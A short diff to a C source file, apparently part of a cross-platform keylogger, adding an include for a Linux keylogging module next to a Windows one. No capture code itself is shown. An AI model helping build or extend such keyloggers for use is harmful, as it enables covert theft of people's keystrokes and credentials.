@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include "Windows/win_keylog.c"
+#include "Linux/linux_keylog.c"
 
 // depending on the OS, we'll use a different path for the log file
 #ifdef __linux__
